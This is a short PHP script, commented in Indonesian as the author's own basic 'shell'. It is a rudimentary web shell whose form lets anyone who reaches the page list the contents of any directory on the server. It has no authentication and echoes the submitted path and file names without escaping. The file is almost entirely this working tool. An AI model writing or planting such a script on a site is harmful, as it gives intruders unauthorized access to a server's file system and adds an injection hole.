<?php
/*/**Ini adalah Shell Dasarr dan versi buatanku **/
$list= '';
if(isset($_POST['klik'])){$dir= $_POST['files'];
    $files= scandir($dir);
    echo "Daftar file di direktori $dir";
    foreach($files as $file){
        if($file != "." && $file != ".."){
            $list .= $file . "<br>";
        }
    }
}
else {
    $list = "Tidak ada list";
}?>
<html>
    <h1><?=__DIR__?></h1>
    <form action="" method="post">
        <input type="text" name="files">Masukkan
        <button name="klik">Masuk</button>
        <p><?=$list?></p>
    </form>
</html>
